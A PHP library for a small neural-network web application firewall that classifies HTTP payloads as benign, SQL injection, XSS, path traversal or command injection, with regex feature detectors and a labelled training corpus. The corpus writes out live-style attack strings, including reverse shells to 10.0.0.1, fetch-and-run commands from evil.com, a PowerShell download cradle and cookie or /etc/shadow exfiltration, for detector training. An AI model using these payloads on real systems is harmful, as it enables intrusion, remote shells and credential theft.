<?php

/**
 * NiNa Web Application Firewall (WAF) - Threat Classifier Common Library
 *
 * Baseline Architecture: 24 Inputs -> 32 Hidden (Tanh) -> 16 Hidden (Tanh) -> 5 Outputs (Sigmoid)
 * Total Parameters: (24 * 32) + (32 * 16) + (16 * 5) = 768 + 512 + 80 = 1,360 weights.
 *
 * Threat Classes:
 *   0: BENIGN  - Legitimate traffic (queries, JSON, JWTs, UUIDs, natural text)
 *   1: SQLI    - SQL Injection (UNION, tautologies, blind/time-based, encoded)
 *   2: XSS     - Cross-Site Scripting (script tags, event handlers, JS URIs)
 *   3: LFI     - Path Traversal & Local File Inclusion (../, /etc/passwd, php://)
 *   4: RCE     - Command Injection & Remote Code Execution (;|&, subshells, binaries)
 *
 * @package NiNa\Examples\WAF
 */

require_once __DIR__ . '/../../src/autoload.php';

use mc\nina\Cell;
use mc\nina\Layer;
use mc\nina\Network;
use mc\nina\activation\Tanh;
use mc\nina\activation\Sigmoid;
use mc\nina\initializer\XavierInitializer;

const WAF_INPUT_SIZE = 24;
const WAF_NUM_CLASSES = 5;

const WAF_CLASS_BENIGN = 0;
const WAF_CLASS_SQLI   = 1;
const WAF_CLASS_XSS    = 2;
const WAF_CLASS_LFI    = 3;
const WAF_CLASS_RCE    = 4;

/**
 * Returns metadata for the 5 WAF classification categories.
 *
 * @return array<int, array{code: string, name: string, severity: string}>
 */
function getWafClassInfo(): array
{
    return [
        WAF_CLASS_BENIGN => ['code' => 'BENIGN', 'name' => 'Benign Request',           'severity' => 'NONE'],
        WAF_CLASS_SQLI   => ['code' => 'SQLI',   'name' => 'SQL Injection',            'severity' => 'CRITICAL'],
        WAF_CLASS_XSS    => ['code' => 'XSS',    'name' => 'Cross-Site Scripting',     'severity' => 'HIGH'],
        WAF_CLASS_LFI    => ['code' => 'LFI',    'name' => 'Path Traversal / LFI',     'severity' => 'HIGH'],
        WAF_CLASS_RCE    => ['code' => 'RCE',    'name' => 'Command Injection (RCE)',  'severity' => 'CRITICAL'],
    ];
}

/**
 * Returns human-readable names for all 24 extracted features.
 *
 * @return array<int, string>
 */
function getWafFeatureNames(): array
{
    return [
        0  => 'length_log_norm',
        1  => 'shannon_entropy',
        2  => 'special_char_ratio',
        3  => 'url_hex_encoding',
        4  => 'digit_ratio',
        5  => 'uppercase_ratio',
        6  => 'quote_density',
        7  => 'angle_bracket_density',
        8  => 'comment_markers',
        9  => 'path_traversal_tokens',
        10 => 'shell_chaining_tokens',
        11 => 'sql_verbs',
        12 => 'sql_tautology',
        13 => 'sql_functions_schema',
        14 => 'xss_html_tags',
        15 => 'xss_event_handlers',
        16 => 'xss_js_execution',
        17 => 'lfi_unix_targets',
        18 => 'lfi_win_php_targets',
        19 => 'rce_shell_binaries',
        20 => 'rce_recon_commands',
        21 => 'rce_subshell_redirect',
        22 => 'benign_structure_score',
        23 => 'bias_unit',
    ];
}

/**
 * Extracts a 24-dimensional normalized feature vector in [0.0, 1.0] from a raw HTTP payload.
 *
 * @param string $payload Raw query string, parameter value, URI path, or body snippet
 * @return array<float> 24 floats in [0.0, 1.0]
 */
function extractWafFeatures(string $payload): array
{
    $len = strlen($payload);
    if ($len === 0) {
        $empty = array_fill(0, WAF_INPUT_SIZE, 0.0);
        $empty[22] = 1.0; // Benign empty
        $empty[23] = 1.0; // Bias
        return $empty;
    }

    // Decode one layer of URL encoding for lexical inspection while keeping raw for encoding metrics
    $decodedOnce = rawurldecode($payload);
    $decodedTwice = rawurldecode($decodedOnce);
    $norm = strtolower($decodedTwice);
    // Normalize inline SQL comments like /**/ to space for keyword matching
    $normClean = (string)preg_replace('/\/\*.*?\*\//s', ' ', $norm);

    // 0. Log-normalized length
    $f0_length = min(1.0, log(1.0 + $len) / log(256.0));

    // 1. Shannon byte entropy (normalized by 6.0 bits)
    $freq = count_chars($payload, 1);
    $entropy = 0.0;
    foreach ($freq as $count) {
        $p = $count / $len;
        $entropy -= $p * log($p, 2);
    }
    $f1_entropy = min(1.0, $entropy / 6.0);

    // 2. Character ratios on decoded payload
    $dLen = max(1, strlen($decodedOnce));
    $specialCount = preg_match_all('/[\'"<>`;|&$\(\)=\\\\\/%\*\{\}\[\]]/', $decodedOnce);
    $f2_special = min(1.0, ($specialCount / $dLen) * 2.5);

    // 3. URL / Hex / Unicode encoding density
    $encMatches = preg_match_all('/(%[0-9a-fA-F]{2}|\\\\x[0-9a-fA-F]{2}|&#x?[0-9a-fA-F]+;?)/', $payload);
    $f3_encoding = min(1.0, $encMatches / 6.0);

    // 4. Digit ratio
    $digitCount = preg_match_all('/[0-9]/', $decodedOnce);
    $f4_digits = min(1.0, ($digitCount / $dLen) * 2.0);

    // 5. Uppercase ratio
    $upperCount = preg_match_all('/[A-Z]/', $decodedOnce);
    $f5_upper = min(1.0, ($upperCount / $dLen) * 2.5);

    // 6. Quote density (' " `)
    $quoteCount = preg_match_all('/[\'"`]|%27|%22/', $payload);
    $f6_quotes = min(1.0, $quoteCount / 4.0);

    // 7. Angle bracket density (< >)
    $angleCount = preg_match_all('/[<>]|%3[cCeE]/', $payload);
    $f7_angles = min(1.0, $angleCount / 4.0);

    // 8. SQL / script comment markers (--, /*, */, #)
    $commentCount = preg_match_all('/(--|\/\*|\*\/|#|%23)/', $payload);
    $f8_comments = min(1.0, $commentCount / 2.0);

    // 9. Path traversal tokens (../, ..\, %2e%2e, ..%2f)
    $traversalCount = preg_match_all('/(\.\.\/|\.\.\\\\|%2e%2e|\.\.%2f|\.\.%5c)/i', $payload);
    $f9_traversal = min(1.0, $traversalCount / 2.0);

    // 10. Shell command chaining tokens (; | && || ` $()
    $shellChainCount = preg_match_all('/(;\s*[a-z\/]|(?<!\|)\|(?!\|)|\||&&|\|\||`|\$\()/', $decodedTwice);
    $f10_shellChain = min(1.0, $shellChainCount / 2.0);

    // 11. SQL query verbs (SELECT, UNION, INSERT, UPDATE, DELETE, DROP, FROM, WHERE)
    $sqlVerbCount = preg_match_all(
        '/\b(union\s+all|union\s+select|select\b.*\bfrom|insert\s+into|update\b.*\bset|delete\s+from|drop\s+table|alter\s+table|order\s+by\s+\d+|group\s+by\s+\d+|having\s+\d+)/i',
        $normClean
    );
    $sqlSingleVerbs = preg_match_all('/\b(union|select|from|where|insert|drop|truncate)\b/i', $normClean);
    $f11_sqlVerbs = min(1.0, $sqlVerbCount * 0.6 + ($sqlSingleVerbs >= 2 ? 0.5 : $sqlSingleVerbs * 0.15));

    // 12. SQL tautologies & boolean injections (' OR 1=1, 'a'='a', OR true, AND 1=0)
    $sqlTautCount = preg_match_all(
        '/([\'"\d\)]\s*(or|and|&&|\|\|)\s*[\'"]?\d+[\'"]?\s*[=<>!]+\s*[\'"]?\d+|[\'"]\s*or\s*[\'"][^\'"]+[\'"]\s*=\s*[\'"]|\b(or|and)\s+(true|false)\b|[\'"]\s*=\s*[\'"]|\b1\s*=\s*1\b|\b0\s*=\s*0\b)/i',
        $normClean
    );
    $f12_sqlTaut = min(1.0, $sqlTautCount * 0.7);

    // 13. SQL functions & schema probes (SLEEP, BENCHMARK, INFORMATION_SCHEMA, CONCAT, CHAR, WAITFOR)
    $sqlFuncCount = preg_match_all(
        '/\b(sleep\s*\(|pg_sleep|benchmark\s*\(|waitfor\s+delay|information_schema|sysobjects|xp_cmdshell|group_concat|concat\s*\(|load_file|into\s+(out|dump)file|@@version|version\s*\(\)|char\s*\(\d+)/i',
        $normClean
    );
    $f13_sqlFunc = min(1.0, $sqlFuncCount * 0.7);

    // 14. XSS HTML tags (<script, <svg, <iframe, <img, <body, <object, <embed, <style, <math)
    $xssTagCount = preg_match_all(
        '/<\s*\/?\s*(script|svg|iframe|img|body|object|embed| math|video|audio|details|marquee|input|form)\b/i',
        $normClean
    );
    $f14_xssTags = min(1.0, $xssTagCount * 0.65);

    // 15. XSS DOM event handlers (onerror=, onload=, onclick=, onmouseover=, onfocus=, ontoggle=)
    $xssEventCount = preg_match_all(
        '/\bon(error|load|click|mouseover|mouseenter|focus|blur|submit|change|keyup|keydown|animationstart|toggle|pageshow)\s*=/i',
        $normClean
    );
    $f15_xssEvents = min(1.0, $xssEventCount * 0.8);

    // 16. XSS JS execution sinks & pseudo-protocols (javascript:, alert(, document.cookie, eval()
    $xssJsCount = preg_match_all(
        '/(javascript\s*:|vbscript\s*:|data\s*:\s*text\/html|\b(alert|prompt|confirm|eval|settimeout|setinterval|function)\s*\(|document\.(cookie|domain|write|location)|window\.location|fromcharcode)/i',
        $normClean
    );
    $f16_xssJs = min(1.0, $xssJsCount * 0.75);

    // 17. LFI Unix sensitive targets (/etc/passwd, /etc/shadow, /proc/self, /var/log, .ssh/)
    $lfiUnixCount = preg_match_all(
        '/(\/etc\/(passwd|shadow|hosts|group|issue|apache2|nginx)|\/proc\/self\/(environ|cmdline|fd)|\/var\/(log|www|mail)|\.ssh\/(id_rsa|authorized_keys)|\.bash_history)/i',
        $normClean
    );
    $f17_lfiUnix = min(1.0, $lfiUnixCount * 0.85);

    // 18. LFI Windows & PHP stream wrappers (win.ini, boot.ini, system32, php://filter, data://, %00)
    $lfiWinPhpCount = preg_match_all(
        '/(win\.ini|boot\.ini|windows\\\\system32|c:\\\\|php:\/\/(filter|input|stdin)|zip:\/\/|phar:\/\/|expect:\/\/|file:\/\/|%00|\\\\0)/i',
        $payload . ' ' . $normClean
    );
    $f18_lfiWinPhp = min(1.0, $lfiWinPhpCount * 0.8);

    // 19. RCE shell binaries & interpreters (/bin/sh, /bin/bash, cmd.exe, powershell, python -c, php -r)
    $rceShellCount = preg_match_all(
        '/(\/bin\/(ba)?sh|\/bin\/zsh|\/usr\/bin\/|cmd\.exe|powershell(\.exe)?|\b(python|perl|ruby|php|node|lua)\s+-[cer]\b|\bnc\s+-[el])/i',
        $normClean
    );
    $f19_rceShell = min(1.0, $rceShellCount * 0.85);

    // 20. RCE reconnaissance & system commands (whoami, id, uname, cat, curl, wget, chmod, rm -rf)
    $rceCmdCount = preg_match_all(
        '/(?:^|[;|&`\$\(\)\s])(whoami|id\b|uname\s+-[a-z]|cat\s+[\/\w\.]|ls\s+-[la]|curl\s+http|wget\s+http|chmod\s+\+?[0-7x]+|rm\s+-rf|ping\s+-[cn]\s+\d+|netstat\b|ifconfig\b|ipconfig\b|nslookup\b|find\s+\/)/i',
        $normClean
    );
    $f20_rceCmd = min(1.0, $rceCmdCount * 0.75);

    // 21. RCE subshell, environment & redirection ($IFS, ${, 2>&1, >/dev/tcp, /tmp/)
    $rceSubCount = preg_match_all(
        '/(\$ifs\b|\$\{[^\}]+\}|\$\([^\)]+\)|`[^`]+`|2>&1|\/dev\/(tcp|null)|\/tmp\/[a-z0-9_\.]+)/i',
        $normClean
    );
    $f21_rceSub = min(1.0, $rceSubCount * 0.75);

    // 22. Benign structural score (high when payload matches clean text, email, UUID, slug, or clean JSON/query)
    $attackSignalSum = $f8_comments + $f9_traversal + $f11_sqlVerbs + $f12_sqlTaut + $f13_sqlFunc
        + $f14_xssTags + $f15_xssEvents + $f16_xssJs + $f17_lfiUnix + $f18_lfiWinPhp
        + $f19_rceShell + $f20_rceCmd + $f21_rceSub;
    $f22_benign = max(0.0, 1.0 - min(1.0, $attackSignalSum * 1.2));

    // 23. Constant bias unit
    $f23_bias = 1.0;

    return [
        $f0_length,
        $f1_entropy,
        $f2_special,
        $f3_encoding,
        $f4_digits,
        $f5_upper,
        $f6_quotes,
        $f7_angles,
        $f8_comments,
        $f9_traversal,
        $f10_shellChain,
        $f11_sqlVerbs,
        $f12_sqlTaut,
        $f13_sqlFunc,
        $f14_xssTags,
        $f15_xssEvents,
        $f16_xssJs,
        $f17_lfiUnix,
        $f18_lfiWinPhp,
        $f19_rceShell,
        $f20_rceCmd,
        $f21_rceSub,
        $f22_benign,
        $f23_bias,
    ];
}

/**
 * Builds the WAF neural network with the 24 -> 32 -> 16 -> 5 baseline architecture.
 *
 * - Layer 1 (Hidden 1): 32 neurons, 24 inputs each, Tanh activation
 * - Layer 2 (Hidden 2): 16 neurons, 32 inputs each, Tanh activation
 * - Layer 3 (Output):    5 neurons, 16 inputs each, Sigmoid activation
 * Total weights: 768 + 512 + 80 = 1,360.
 *
 * @param array<int> $hiddenSizes Hidden layer neuron counts (default [32, 16])
 * @return Network
 */
function createWafNetwork(array $hiddenSizes = [32, 16]): Network
{
    $layers = [];
    $prevSize = WAF_INPUT_SIZE;

    foreach ($hiddenSizes as $layerIdx => $numNeurons) {
        $cells = [];
        for ($i = 0; $i < $numNeurons; $i++) {
            $cells[] = Cell::Create("h{$layerIdx}_{$i}", $prevSize, 0.0, new Tanh());
        }
        $layers[] = new Layer("hidden_layer_" . ($layerIdx + 1), $cells);
        $prevSize = $numNeurons;
    }

    $outputCells = [];
    $classInfo = getWafClassInfo();
    for ($c = 0; $c < WAF_NUM_CLASSES; $c++) {
        $code = strtolower($classInfo[$c]['code']);
        $outputCells[] = Cell::Create("out_{$code}", $prevSize, 0.0, new Sigmoid());
    }
    $layers[] = new Layer("output_layer", $outputCells);

    $archLabel = WAF_INPUT_SIZE . "_" . implode("_", $hiddenSizes) . "_" . WAF_NUM_CLASSES;
    $network = new Network("waf_classifier_{$archLabel}", $layers);
    $network->initializeWeights(new XavierInitializer());

    return $network;
}

/**
 * Counts total trainable weights across all layers of a Network.
 *
 * @param Network $network
 * @return array{total_weights: int, total_neurons: int, layer_breakdown: array<int, array{name: string, neurons: int, inputs_per_neuron: int, weights: int, activation: string}>}
 */
function getNetworkArchitectureStats(Network $network): array
{
    $totalWeights = 0;
    $totalNeurons = 0;
    $breakdown = [];

    for ($l = 0; $l < $network->GetNrLayers(); $l++) {
        $layer = $network->GetLayer($l);
        $neurons = $layer->GetSize();
        $inputsPerNeuron = $neurons > 0 ? $layer->GetCell(0)->GetSize() : 0;
        $activation = $neurons > 0 ? $layer->GetCell(0)->GetActivationFunction()->getName() : 'none';
        $weights = $neurons * $inputsPerNeuron;

        $totalNeurons += $neurons;
        $totalWeights += $weights;

        $breakdown[] = [
            'name' => $layer->GetName(),
            'neurons' => $neurons,
            'inputs_per_neuron' => $inputsPerNeuron,
            'weights' => $weights,
            'activation' => $activation,
        ];
    }

    return [
        'total_weights' => $totalWeights,
        'total_neurons' => $totalNeurons,
        'layer_breakdown' => $breakdown,
    ];
}

/**
 * Creates a one-hot target vector of length 5 for the given threat class (0-4).
 *
 * @param int $classId
 * @return array<float>
 */
function createWafOneHot(int $classId): array
{
    $vec = array_fill(0, WAF_NUM_CLASSES, 0.0);
    $vec[$classId] = 1.0;
    return $vec;
}

/**
 * Returns curated corpus of training and unseen test payloads across all 5 classes.
 *
 * @return array{train: array<int, array{payload: string, class: int}>, test: array<int, array{payload: string, class: int}>}
 */
function getWafCorpus(): array
{
    $corpus = [
        WAF_CLASS_BENIGN => [
            // Train benign payloads (including tricky edge cases with quotes, SQL words, paths, and high entropy)
            "page=1&limit=25&sort=created_at&order=desc",
            "search=wireless+bluetooth+headphones+noise+cancelling",
            "email=john.doe+newsletter@example-company.co.uk",
            "user_id=550e8400-e29b-41d4-a716-446655440000",
            "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "{\"customer\":\"O'Connor\",\"items\":[{\"sku\":\"KB-104\",\"qty\":2,\"price\":49.99}]}",
            "comment=Please select an update option from the dropdown menu before Friday.",
            "path=/assets/images/products/2026/summer_collection_banner.webp",
            "filter=price>=100&category=electronics&brand=sony",
            "name=Patrick+O%27Brien&city=St.+Louis&zip=63101",
            "query=how+to+learn+sql+select+and+join+queries+for+beginners",
            "redirect_uri=https%3A%2F%2Fapp.example.com%2Foauth%2Fcallback%3Fstate%3Dxyz987",
            "bio=Software+engineer+working+on+Linux+%26+Windows+cloud+infrastructure.",
            "math_formula=(a+b)*(c-d)/2.5",
            "session_token=a9f4e2c1b8d76054321fedcba9876543f0123456",
            "article_slug=understanding-html-tags-and-javascript-closures-2026",
            "phone=%2B1-800-555-0199&ext=402",
            "address=742+Evergreen+Terrace%2C+Apt+%234B",
            "report_file=docs/quarterly/Q3_financial_summary_v2.pdf",
            "feedback=The+new+dashboard+loads+fast+and+looks+great%21",
            // Unseen test benign payloads
            "category=books&author=O%27Reilly+Media&year=2026",
            "{\"action\":\"update_profile\",\"timezone\":\"America/New_York\",\"notifications\":true}",
            "note=Please+drop+by+the+office+or+select+a+time+slot+for+our+meeting.",
            "download=reports/2026/annual_audit_final.xlsx",
            "token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW5fdGVzdCJ9.sig12345",
        ],
        WAF_CLASS_SQLI => [
            // Train SQLi payloads
            "' OR 1=1 --",
            "admin' --",
            "' OR 'a'='a",
            "1' OR '1'='1' /*",
            "1 UNION SELECT username, password FROM users--",
            "-1' UNION ALL SELECT null, version(), user(), database()--",
            "1; DROP TABLE users; --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "1' AND SLEEP(5)--",
            "1); WAITFOR DELAY '0:0:5'--",
            "admin') OR ('1'='1'--",
            "%27%20OR%201%3D1%20--",
            "1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables--",
            "1'/**/UNION/**/ALL/**/SELECT/**/concat(login,0x3a,pass)/**/FROM/**/members#",
            "1 AND BENCHMARK(5000000,MD5('test'))",
            "' OR 1=1 LIMIT 1 OFFSET 0 #",
            "1' HAVING 1=1--",
            "1' ORDER BY 10--",
            "'; INSERT INTO admins (username, password) VALUES ('hacker', 'pwned');--",
            "1' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
            // Unseen test SQLi payloads
            "user=admin%27%20OR%20%27x%27%3D%27x%27--",
            "id=-999 UNION SELECT 1,load_file('/etc/mysql/my.cnf'),3--",
            "sort=price ASC; SELECT pg_sleep(10)--",
            "login=' OR true #",
            "item_id=42'/**/AND/**/1=0/**/UNION/**/SELECT/**/username,password/**/FROM/**/accounts--",
        ],
        WAF_CLASS_XSS => [
            // Train XSS payloads
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "\"><script src=\"http://evil.com/xss.js\"></script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(document.domain)>",
            "<body onload=prompt(1)>",
            "javascript:alert(document.cookie)",
            "<iframe src=\"javascript:alert('pwned')\"></iframe>",
            "' onmouseover='alert(1)' bad='",
            "<input autofocus onfocus=eval(atob('YWxlcnQoMSk='))>",
            "%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
            "<details open ontoggle=confirm(document.domain)>",
            "<a href=\"javascript:window.location='http://attacker.com/?c='+document.cookie\">Click</a>",
            "<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<ScRiPt>prompt(1337)</sCrIpT>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            "\" onfocus=\"javascript:alert(1)\" autofocus=\"",
            "<video><source onerror=\"javascript:alert(document.cookie)\">",
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            "<marquee onstart=alert(1)>test</marquee>",
            // Unseen test XSS payloads
            "<svg/onload=confirm(document.cookie)>",
            "q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
            "redirect=javascript:eval('alert(document.domain)')",
            "<iframe onload=alert('XSS') src=about:blank></iframe>",
            "name=' onclick='window.location=\"https://evil.tld/?\"+document.cookie'",
        ],
        WAF_CLASS_LFI => [
            // Train LFI / Path Traversal payloads
            "../../../../etc/passwd",
            "../../../../../../etc/shadow",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/var/www/../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=../config/database.php",
            "file:///etc/hosts",
            "../../../proc/self/environ",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "../../../../home/ubuntu/.ssh/id_rsa",
            "../../../../var/log/apache2/access.log",
            "expect://id",
            "phar://uploads/avatar.jpg/shell.php",
            "zip://archive.zip%23../../shell.php",
            "C:\\Windows\\System32\\cmd.exe",
            "../../../etc/nginx/nginx.conf%00.jpg",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/proc/self/cmdline",
            // Unseen test LFI payloads
            "page=../../../../etc/passwd%00.html",
            "template=php://filter/convert.base64-encode/resource=../../.env",
            "file=..%2f..%2f..%2fvar%2flog%2fnginx%2ferror.log",
            "include=..\\..\\..\\windows\\boot.ini",
            "path=/var/www/html/../../../root/.bash_history",
        ],
        WAF_CLASS_RCE => [
            // Train Command Injection / RCE payloads
            "127.0.0.1; cat /etc/passwd",
            "8.8.8.8 | whoami",
            "localhost && uname -a",
            "$(whoami)",
            "`id; uname -a`",
            "127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
            "file.txt; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
            "| curl http://attacker.com/payload.py | python -c 'import os; os.system(\"id\")'",
            "& cmd.exe /c whoami & ipconfig /all",
            "; powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/s.ps1')\"",
            "127.0.0.1 || nc -e /bin/sh 10.0.0.1 9001",
            "test;cat\${IFS}/etc/passwd",
            "ping -c 4 127.0.0.1; rm -rf /tmp/backdoor; mkfifo /tmp/backdoor",
            "`curl http://169.254.169.254/latest/meta-data/`",
            "; php -r '\$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "| ls -la /var/www/html",
            "&& netstat -tulnp",
            "; perl -e 'exec \"/bin/sh\";'",
            "\$(cat /etc/shadow | curl -X POST -d @- http://evil.com/exfil)",
            "127.0.0.1 & powershell -Command \"Get-Process\"",
            // Unseen test RCE payloads
            "host=127.0.0.1; id; whoami",
            "ip=10.0.0.1 && curl http://evil.tld/bot.sh -o /tmp/bot.sh && /bin/sh /tmp/bot.sh",
            "cmd=`uname -a`",
            "target=localhost | /bin/bash -c 'cat /etc/hosts'",
            " ping=127.0.0.1 & cmd.exe /c netstat -an",
        ],
    ];

    $train = [];
    $test = [];

    foreach ($corpus as $classId => $payloads) {
        // First 20 per class for training, last 5 per class for unseen validation
        foreach ($payloads as $idx => $payload) {
            $record = [
                'payload' => $payload,
                'class' => $classId,
                'input' => extractWafFeatures($payload),
                'target' => createWafOneHot($classId),
            ];
            if ($idx < 20) {
                $train[] = $record;
            } else {
                $test[] = $record;
            }
        }
    }

    // Interleave classes in training set so every mini-batch / epoch sees balanced classes
    $interleavedTrain = [];
    for ($i = 0; $i < 20; $i++) {
        for ($c = 0; $c < WAF_NUM_CLASSES; $c++) {
            $interleavedTrain[] = $train[$c * 20 + $i];
        }
    }

    // Add slightly jittered feature augmentations to training set (x2 = 200 training samples)
    $augmentedTrain = $interleavedTrain;
    foreach ($interleavedTrain as $sample) {
        $noisyInput = $sample['input'];
        for ($f = 0; $f < WAF_INPUT_SIZE - 1; $f++) {
            if ($noisyInput[$f] > 0.0) {
                $jitter = (mt_rand(-50, 50) / 1000.0); // ±0.05 feature jitter
                $noisyInput[$f] = max(0.0, min(1.0, $noisyInput[$f] + $jitter));
            }
        }
        $augmentedTrain[] = [
            'payload' => $sample['payload'],
            'class' => $sample['class'],
            'input' => $noisyInput,
            'target' => $sample['target'],
        ];
    }

    return [
        'train' => $augmentedTrain,
        'train_unique' => $interleavedTrain,
        'test' => $test,
    ];
}

/**
 * Classifies a raw HTTP payload using the trained WAF network and returns threat analysis.
 *
 * @param Network $network
 * @param string $payload
 * @return array{
 *   payload: string,
 *   predicted_class: int,
 *   class_code: string,
 *   class_name: string,
 *   severity: string,
 *   confidence: float,
 *   threat_score: float,
 *   action: string,
 *   probabilities: array<int, float>,
 *   features: array<float>
 * }
 */
function classifyWafPayload(Network $network, string $payload): array
{
    $features = extractWafFeatures($payload);
    $rawOutputs = $network->Calculate($features);

    // Normalize scores into a probability distribution for clean reporting
    $sum = array_sum($rawOutputs);
    $probabilities = [];
    foreach ($rawOutputs as $c => $val) {
        $probabilities[$c] = $sum > 1e-9 ? ($val / $sum) : (1.0 / WAF_NUM_CLASSES);
    }

    $bestClass = 0;
    $bestScore = -1.0;
    foreach ($rawOutputs as $c => $val) {
        if ($val > $bestScore) {
            $bestScore = $val;
            $bestClass = (int)$c;
        }
    }

    $classInfo = getWafClassInfo()[$bestClass];
    $threatScore = 1.0 - $probabilities[WAF_CLASS_BENIGN];

    if ($bestClass === WAF_CLASS_BENIGN && $threatScore < 0.35) {
        $action = 'ALLOW (200 OK)';
    } elseif ($bestClass === WAF_CLASS_BENIGN || $bestScore < 0.55) {
        $action = 'CHALLENGE / LOG';
    } else {
        $action = 'BLOCK (403 Forbidden)';
    }

    return [
        'payload' => $payload,
        'predicted_class' => $bestClass,
        'class_code' => $classInfo['code'],
        'class_name' => $classInfo['name'],
        'severity' => $classInfo['severity'],
        'confidence' => $bestScore,
        'threat_score' => $threatScore,
        'action' => $action,
        'raw_outputs' => $rawOutputs,
        'probabilities' => $probabilities,
        'features' => $features,
    ];
}

/**
 * Evaluates the WAF network on a dataset and computes accuracy, confusion matrix, and per-class Precision/Recall/F1.
 *
 * @param Network $network
 * @param array $dataset
 * @return array
 */
function evaluateWafPerformance(Network $network, array $dataset): array
{
    $confusion = array_fill(0, WAF_NUM_CLASSES, array_fill(0, WAF_NUM_CLASSES, 0));
    $correct = 0;
    $total = count($dataset);

    foreach ($dataset as $sample) {
        $res = classifyWafPayload($network, $sample['payload']);
        $expected = $sample['class'];
        $predicted = $res['predicted_class'];

        $confusion[$expected][$predicted]++;
        if ($expected === $predicted) {
            $correct++;
        }
    }

    $metrics = [];
    for ($c = 0; $c < WAF_NUM_CLASSES; $c++) {
        $tp = $confusion[$c][$c];
        $fp = 0;
        $fn = 0;
        for ($k = 0; $k < WAF_NUM_CLASSES; $k++) {
            if ($k !== $c) {
                $fp += $confusion[$k][$c];
                $fn += $confusion[$c][$k];
            }
        }
        $precision = ($tp + $fp) > 0 ? ($tp / ($tp + $fp)) : 0.0;
        $recall = ($tp + $fn) > 0 ? ($tp / ($tp + $fn)) : 0.0;
        $f1 = ($precision + $recall) > 0 ? (2.0 * $precision * $recall / ($precision + $recall)) : 0.0;

        $metrics[$c] = [
            'tp' => $tp,
            'fp' => $fp,
            'fn' => $fn,
            'precision' => $precision,
            'recall' => $recall,
            'f1' => $f1,
        ];
    }

    return [
        'accuracy' => $total > 0 ? ($correct / $total) : 0.0,
        'correct' => $correct,
        'total' => $total,
        'confusion' => $confusion,
        'per_class' => $metrics,
    ];
}
